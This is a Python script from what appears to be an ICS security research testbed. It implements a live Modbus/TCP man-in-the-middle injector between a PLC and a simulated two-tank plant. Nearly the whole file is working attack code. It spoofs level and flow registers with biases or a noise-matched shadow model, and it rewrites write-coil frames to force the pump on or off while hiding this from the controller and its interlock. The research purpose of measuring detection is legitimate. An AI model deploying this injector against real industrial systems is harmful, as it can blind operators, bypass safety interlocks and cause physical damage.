#!/usr/bin/env python
"""Phase 2, step 2.4 - live Modbus/TCP man-in-the-middle injector for the attack rungs.

Sits between the Modbus clients (OpenPLC, the MQTT publisher) and the twin: it forwards
every frame to the real twin on :5020 and rewrites registers in flight, realising the
same source-spoof rungs as the offline harness (scripts/phase2_attacks.py) on the live
stack. Standard library only.

    client :5021  <->  this proxy  <->  twin :5020

Wiring (primary, lowest friction): the proxy TAKES OVER :5020 and the twin moves aside.
  * configs/twin.yaml  modbus.port: 5020 -> 5030, restart the twin only
  * run the proxy with --listen-port 5020 --twin-port 5030
  * OpenPLC and the publisher are untouched - they still dial :5020, now the proxy
This makes the attacker a transparent man-in-the-middle on the existing control path, the
strongest adversary: it reproduces the Modbus semantics exactly, so the only network signal
is the timing the extra hop adds (Arm N's latency/jitter). Revert by restoring modbus.port.

Alternative (rogue-client wiring): keep the twin on :5020, run the proxy on :5021, and point
OpenPLC's slave device (and, for telemetry fabrication, the publisher) at :5021. Here the
attacker opens its own control-path connection, so Arm N also gets the loud SYN/whitelist
signal. Use this to contrast a stealthy MITM with a rogue client.

Rungs (match phase2_attacks.py):
  R0-step        h1 register stepped -20 mm
  R1-drift       h1 drifts down 0.2 mm/s        R1-creep   0.01 mm/s
  R2-fab-clean   all five registers from a shadow plant model, quantised, no noise;
                 the real pump is forced ON by rewriting the FC15 write-coils frame
  R3-fab-matched as R2 with matched sensor noise (the covert limit)
  *-drain        force the real pump OFF instead
The shadow model is a scalar RK4 of physics.py, driven by the pump the PLC commands
(read from the FC15 writes the proxy forwards), started from the registers seen at onset.
Under fabrication the shadow and the PLC form their own in-band closed loop, so the
reported feed looks like a normally controlled plant while the real pump is forced.

Rewrites are applied `--arm` seconds after the first client connects, for `--duration` s
(0 = until stopped). Onset wall-clock and every parameter are written to a sidecar JSON.

    # configs/twin.yaml: modbus.port 5020 -> 5030; restart the twin
    sudo ./scripts/capture_traffic.sh 900 data/raw/pcap_attack
    python scripts/phase2_live_inject.py --rung R3-fab-matched --arm 120 --duration 600 \
           --listen-port 5020 --twin-port 5030

SAFETY: this drives the real plant. The high-high interlock still protects it ONLY on the
honest readings the PLC no longer sees, so a fabrication can overflow or drain the tank in
simulation. That is the point of the measurement; it is a simulated plant, nothing physical.
"""
from __future__ import annotations

import argparse
import json
import math
import random
import select
import socket
import struct
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

import yaml

CLPM = 6_000_000.0
RUNGS = {
    "R0-step": {"kind": "bias", "step_mm": 20.0, "rate": 0.0, "cap_mm": 20.0},
    "R1-drift": {"kind": "bias", "step_mm": 0.0, "rate": 0.2, "cap_mm": 300.0},
    "R1-creep": {"kind": "bias", "step_mm": 0.0, "rate": 0.01, "cap_mm": 300.0},
    "R2-fab-clean": {"kind": "fab", "noise": False, "force": 1.0},
    "R3-fab-matched": {"kind": "fab", "noise": True, "force": 1.0},
    "R2-fab-clean-drain": {"kind": "fab", "noise": False, "force": 0.0},
    "R3-fab-matched-drain": {"kind": "fab", "noise": True, "force": 0.0},
}


class Shadow:
    """Scalar RK4 of the two-tank plant, driven by the commanded pump; thread-safe."""

    def __init__(self, cfg: dict):
        p = cfg["plant"]
        self.A1, self.A2 = float(p["A1"]), float(p["A2"])
        self.k12 = float(p["Cv12"]) * math.sqrt(2 * float(p["g"]))
        self.k2o = float(p["Cv2o"]) * math.sqrt(2 * float(p["g"]))
        self.Qp, self.hmax = float(p["Qpump"]), float(p["h_max"])
        s = cfg["sensors"]
        self.lstd = float(s["level_noise_std"])
        self.qmm = int(s["quantisation_mm"])
        self.lock = threading.Lock()
        self.h1 = self.h2 = None
        self.cmd_pump = 0.0
        self.t = None

    def seed(self, h1_mm: float, h2_mm: float):
        with self.lock:
            if self.h1 is None:
                self.h1, self.h2, self.t = h1_mm / 1000.0, h2_mm / 1000.0, time.monotonic()

    def set_pump(self, on) -> None:
        with self.lock:
            self.cmd_pump = 1.0 if on else 0.0

    def _d(self, a, b, qin):
        q12 = self.k12 * math.sqrt(max(a, 1e-9))
        qo = self.k2o * math.sqrt(max(b, 1e-9))
        return (qin - q12) / self.A1, (q12 - qo) / self.A2

    def advance(self):
        with self.lock:
            if self.h1 is None:
                return None
            now = time.monotonic()
            dt = min(now - self.t, 0.5)
            self.t = now
            qin = self.Qp * self.cmd_pump
            steps = max(1, int(dt / 0.05))
            h = dt / steps
            for _ in range(steps):
                a1, b1 = self._d(self.h1, self.h2, qin)
                a2, b2 = self._d(self.h1 + 0.5 * h * a1, self.h2 + 0.5 * h * b1, qin)
                a3, b3 = self._d(self.h1 + 0.5 * h * a2, self.h2 + 0.5 * h * b2, qin)
                a4, b4 = self._d(self.h1 + h * a3, self.h2 + h * b3, qin)
                self.h1 = min(max(self.h1 + h / 6 * (a1 + 2 * a2 + 2 * a3 + a4), 0.0), self.hmax)
                self.h2 = min(max(self.h2 + h / 6 * (b1 + 2 * b2 + 2 * b3 + b4), 0.0), self.hmax)
            return self.h1, self.h2, qin


# ---------------------------------------------------------------- frame rewriting (pure, unit-tested)
def frames(buf: bytearray):
    """Pop complete MBAP frames from a per-direction buffer; return list of (tid, unit, pdu)."""
    out = []
    while len(buf) >= 8:
        tid, pid, length = struct.unpack("!HHH", buf[:6])
        if pid != 0 or length < 2 or length > 253:
            buf.clear()
            break
        total = 6 + length
        if len(buf) < total:
            break
        frame = bytes(buf[:total])
        del buf[:total]
        out.append((tid, frame[6], frame[7:total]))
    return out


def regs_to_bytes(vals):
    return b"".join(struct.pack("!H", max(0, min(int(round(v)), 65535))) for v in vals)


def pump_bit_of_fc15(pdu: bytes) -> int:
    """Coil 0 (pump) of a write-multiple-coils request: fc,start(2),qty(2),nbytes(1),data..."""
    return 1 if (len(pdu) > 6 and (pdu[6] & 0x01)) else 0


def rewrite_response(pdu: bytes, want: dict) -> bytes:
    """Rewrite an FC4/FC1 response PDU's data. `want` has 'regs' (index->value) for FC4 or
    'coils' (the coil byte: bit0 pump, bit1 valve, bit2 alarm) for FC1."""
    fc = pdu[0]
    if fc == 4 and "regs" in want:
        n = pdu[1]
        count = n // 2
        vals = [want["regs"].get(i, struct.unpack("!H", pdu[2 + 2 * i:4 + 2 * i])[0]) for i in range(count)]
        return bytes([fc, n]) + regs_to_bytes(vals)
    if fc == 1 and "coils" in want:
        nbytes = pdu[1]
        return bytes([fc, nbytes, want["coils"] & 0xFF]) + pdu[3:]
    return pdu


def force_pump_in_fc15(pdu: bytes, force_on: float) -> bytes:
    """Rewrite a write-multiple-coils (FC15) request so coil 0 (pump) = force_on."""
    if pdu[0] != 15:
        return pdu
    start, qty, nbytes = struct.unpack("!HHB", pdu[1:6])
    data = bytearray(pdu[6:6 + nbytes])
    if start == 0 and qty >= 1 and data:
        if force_on >= 0.5:
            data[0] |= 0x01
        else:
            data[0] &= ~0x01
    return pdu[:6] + bytes(data)


# ---------------------------------------------------------------- proxy
class Injector:
    def __init__(self, cfg, rung, arm, duration, listen, twin):
        self.cfg, self.spec = cfg, RUNGS[rung]
        self.rung, self.arm, self.duration = rung, arm, duration
        self.listen, self.twin = listen, twin
        self.shadow = Shadow(cfg)
        self.t0 = None
        self.onset = None
        self.lock = threading.Lock()
        self.events = []

    def active(self) -> bool:
        if self.t0 is None:
            return False
        el = time.monotonic() - self.t0
        if el < self.arm:
            return False
        if self.duration and el > self.arm + self.duration:
            return False
        if self.onset is None:
            with self.lock:
                if self.onset is None:
                    self.onset = time.time()
                    self.events.append((self.onset, "onset", self.rung))
                    print(f"[{datetime.now():%H:%M:%S}] onset: {self.rung}", flush=True)
        return True

    def want(self, last_regs):
        """Spoofed register map and coil byte for the current instant."""
        tau = time.time() - self.onset
        if self.spec["kind"] == "bias":
            bias = min(self.spec["step_mm"] + self.spec["rate"] * tau, self.spec["cap_mm"])
            return {"regs": {0: max(0, last_regs.get(0, 0) - bias)}}, None
        adv = self.shadow.advance()
        if adv is None:
            return {}, None
        h1, h2, qin = adv
        lstd = self.shadow.lstd if self.spec["noise"] else 0.0
        q12 = self.shadow.k12 * math.sqrt(max(h1, 1e-9))
        qo = self.shadow.k2o * math.sqrt(max(h2, 1e-9))
        lvl = lambda h: round((h + lstd * random.gauss(0, 1)) * 1000.0 / self.shadow.qmm) * self.shadow.qmm
        regs = {0: lvl(h1), 1: lvl(h2), 2: round(qin * CLPM), 3: round(q12 * CLPM), 4: round(qo * CLPM)}
        coils = int(self.shadow.cmd_pump) | 0b010         # pump = command, valve open, alarm clear
        return {"regs": regs}, coils

    def handle(self, client_sock, addr):
        try:
            up = socket.create_connection(self.twin)
        except OSError as e:
            print(f"cannot reach twin at {self.twin}: {e}", flush=True)
            client_sock.close()
            return
        with self.lock:
            if self.t0 is None:
                self.t0 = time.monotonic()
        up_buf, down_buf = bytearray(), bytearray()
        pending = {}
        socks = [client_sock, up]
        while True:
            r, _, _ = select.select(socks, [], [], 1.0)
            for s in r:
                try:
                    data = s.recv(65536)
                except OSError:
                    data = b""
                if not data:
                    client_sock.close()
                    up.close()
                    return
                if s is client_sock:                       # client -> twin (requests)
                    up_buf += data
                    out = bytearray()
                    for tid, unit, pdu in frames(up_buf):
                        if pdu[0] == 15:                   # write coils: track pump, maybe force
                            self.shadow.set_pump(pump_bit_of_fc15(pdu))
                            if self.active() and self.spec["kind"] == "fab":
                                pdu = force_pump_in_fc15(pdu, self.spec["force"])
                        if pdu[0] in (1, 4):
                            pending[tid] = pdu[0]
                        out += struct.pack("!HHH", tid, 0, len(pdu) + 1) + bytes([unit]) + pdu
                    up.sendall(out)
                else:                                       # twin -> client (responses)
                    down_buf += data
                    out = bytearray()
                    for tid, unit, pdu in frames(down_buf):
                        fc = pending.pop(tid, None)
                        if self.active() and fc in (1, 4):
                            last = {i: struct.unpack("!H", pdu[2 + 2 * i:4 + 2 * i])[0]
                                    for i in range((pdu[1] // 2) if fc == 4 else 0)}
                            if self.spec["kind"] == "fab" and fc == 4:
                                self.shadow.seed(last.get(0, 300), last.get(1, 300))
                            regs_want, coils = self.want(last)
                            pdu = rewrite_response(pdu, {"coils": coils} if fc == 1 and coils is not None
                                                   else regs_want)
                        out += struct.pack("!HHH", tid, 0, len(pdu) + 1) + bytes([unit]) + pdu
                    client_sock.sendall(out)

    def serve(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(self.listen)
        srv.listen(8)
        print(f"injector '{self.rung}' listening on {self.listen[0]}:{self.listen[1]} -> "
              f"twin {self.twin[0]}:{self.twin[1]}")
        print(f"arm after {self.arm} s, duration {self.duration or 'until stopped'} s", flush=True)
        try:
            while True:
                cs, addr = srv.accept()
                threading.Thread(target=self.handle, args=(cs, addr), daemon=True).start()
        except KeyboardInterrupt:
            pass
        finally:
            srv.close()


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--config", default="configs/twin.yaml")
    ap.add_argument("--rung", required=True, choices=list(RUNGS))
    ap.add_argument("--arm", type=float, default=120.0)
    ap.add_argument("--duration", type=float, default=600.0, help="0 = until stopped")
    ap.add_argument("--listen-port", type=int, default=5021)
    ap.add_argument("--twin-host", default="127.0.0.1")
    ap.add_argument("--twin-port", type=int, default=5020)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    cfg = yaml.safe_load(open(a.config))
    inj = Injector(cfg, a.rung, a.arm, a.duration, ("127.0.0.1", a.listen_port), (a.twin_host, a.twin_port))
    try:
        inj.serve()
    finally:
        rec = {"rung": a.rung, "spec": inj.spec, "arm_s": a.arm, "duration_s": a.duration,
               "listen_port": a.listen_port,
               "created_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
               "onset_wallclock_utc": datetime.fromtimestamp(inj.onset, timezone.utc).isoformat() if inj.onset else None,
               "events": [(datetime.fromtimestamp(t, timezone.utc).isoformat(), k, d) for t, k, d in inj.events]}
        out = Path("reports") / f"phase2_live_{a.rung}_{int(time.time())}.json"
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(rec, indent=2))
        print(f"\nwrote {out}  (onset {rec['onset_wallclock_utc']})")


def selftest() -> None:
    req = struct.pack("!HHHB", 7, 0, 6, 1) + struct.pack("!BHH", 4, 0, 5)
    buf = bytearray(req[:5])
    assert frames(buf) == [] and len(buf) == 5
    buf += req[5:]
    got = frames(buf)
    assert len(got) == 1 and got[0][0] == 7 and got[0][2][0] == 4, got
    buf = bytearray(req + req)
    assert len(frames(buf)) == 2
    rsp = bytes([4, 10]) + regs_to_bytes([300, 299, 360, 175, 174])
    vals = struct.unpack("!5H", rewrite_response(rsp, {"regs": {0: 250, 3: 999}})[2:])
    assert vals == (250, 299, 360, 999, 174), vals
    cr = bytes([1, 1, 0b101])
    assert rewrite_response(cr, {"coils": 0b011})[2] == 0b011
    # FC15: pump bit is data byte bit0 (pdu[6]); start/qty do not confuse it
    w_off = struct.pack("!BHHB", 15, 0, 3, 1) + bytes([0b010])      # valve on, pump off
    w_on = struct.pack("!BHHB", 15, 0, 3, 1) + bytes([0b011])      # valve on, pump on
    assert pump_bit_of_fc15(w_off) == 0 and pump_bit_of_fc15(w_on) == 1, "pump-bit extraction"
    assert force_pump_in_fc15(w_off, 1.0)[6] == 0b011, "force on"
    assert force_pump_in_fc15(w_on, 0.0)[6] == 0b010, "force off"
    assert rewrite_response(rsp, {}) == rsp
    print("selftest OK: reassembly, FC4/FC1 rewrite, FC15 pump-bit + force, passthrough")


if __name__ == "__main__":
    main()
